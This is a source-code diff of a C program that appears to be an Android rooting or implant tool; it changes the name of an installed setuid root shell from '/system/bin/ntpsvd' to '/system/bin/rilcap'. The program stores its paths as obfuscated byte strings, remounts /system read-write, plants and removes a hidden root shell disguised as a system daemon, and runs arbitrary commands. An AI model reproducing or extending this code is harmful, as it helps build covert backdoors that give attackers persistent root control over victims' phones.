@@ -67,8 +67,8 @@ int main(int argc, char** argv) {
 	unsigned char system3[] = "\xd9\x65\xbb\x3e\x6a\x60\x6a\x77\x44\x7c"; // "/system"
 	unsigned char system4[] = "\xca\xa3\x6e\x2b\xff\xf5\xff\xc2\xf1\xe9"; // "/system"
 	unsigned char mntsdcard[] = "\xa4\x98\x37\xbb\xf9\xfa\xf0\xbb\xf7\xc0\xc7\xc5\xf6\xc0"; // "/mnt/sdcard"
-	unsigned char ntpsvd1[] = "\xab\x7b\xc2\x84\x28\x36\x28\x21\x32\x3a\x84\x3f\x46\x3b\x84\x3b\x21\x2d\x28\x23\x31"; // "/system/bin/ntpsvd"
-	unsigned char ntpsvd2[] = "\x2d\xfd\xc2\x02\xa6\xac\xa6\xab\xb8\xc0\x02\xb1\xbc\xbd\x02\xbd\xab\xa7\xa6\xa5\xbb"; // "/system/bin/ntpsvd"
+	unsigned char rilcap1[] = "\x35\x63\x44\x1e\xca\xcc\xca\xc7\xd0\xd8\x1e\xd9\xdc\xdd\x1e\xc9\xdc\xdf\xda\xd4\xcb"; // "/system/bin/rilcap"
+	unsigned char rilcap2[] = "\x78\xd1\xbb\xf9\x0d\x03\x0d\x0c\x3f\x37\xf9\x3a\x33\x36\xf9\x0a\x33\x34\x3d\x3b\x08"; // "/system/bin/rilcap"
 	unsigned char sd[] = "\x2d\xcf\xe0\xe2\xd7"; // "sd"
 	unsigned char ru[] = "\x2c\xb1\x9f\xbe\xbb"; // "ru"
 	unsigned char air[] = "\x9b\xc5\x5d\x7a\x72\x6b"; // "air"
@@ -94,8 +94,8 @@ int main(int argc, char** argv) {
 		LOG("reb - reboot the phone\n");
 		LOG("blr - mount /system in READ_ONLY\n");
 		LOG("blw - mount /system in READ_WRITE\n");
-		LOG("rt - install the root shell in /system/bin/ntpsvd\n");
-		LOG("ru - remove the root shell from /system/bin/ntpsvd\n");
+		LOG("rt - install the root shell in /system/bin/rilcap\n");
+		LOG("ru - remove the root shell from /system/bin/rilcap\n");
 		LOG("sd - mount /sdcard\n");
 		LOG("air - check if the shell has root privileges\n");
 		LOG("qzx \"command\" - execute the given commandline\n");
@@ -140,12 +140,12 @@ int main(int argc, char** argv) {
 	} else if (strcmp(argv[1], deobfuscate(blw)) == 0) { // Monta /system in READ_WRITE
 		LOG("Mounting FS read write\n");
 		remount(deobfuscate(system2), 0);
-	} else if (strcmp(argv[1], deobfuscate(rt)) == 0) {  // Copia la shell root in /system/bin/ntpsvd
+	} else if (strcmp(argv[1], deobfuscate(rt)) == 0) {  // Copia la shell root in /system/bin/rilcap
 		LOG("Installing suid shell\n");
-		copy_root(deobfuscate(system3), deobfuscate(ntpsvd1));
-	} else if (strcmp(argv[1], deobfuscate(ru)) == 0) {  // Cancella la shell root in /system/bin/ntpsvd
+		copy_root(deobfuscate(system3), deobfuscate(rilcap1));
+	} else if (strcmp(argv[1], deobfuscate(ru)) == 0) {  // Cancella la shell root in /system/bin/rilcap
 		LOG("Removing suid shell\n");
-		delete_root(deobfuscate(system4), deobfuscate(ntpsvd2));
+		delete_root(deobfuscate(system4), deobfuscate(rilcap2));
 	} else if (strcmp(argv[1], deobfuscate(sd)) == 0) {  // Mount /sdcard
 		LOG("Mounting /sdcard\n");
 		my_mount(deobfuscate(mntsdcard));
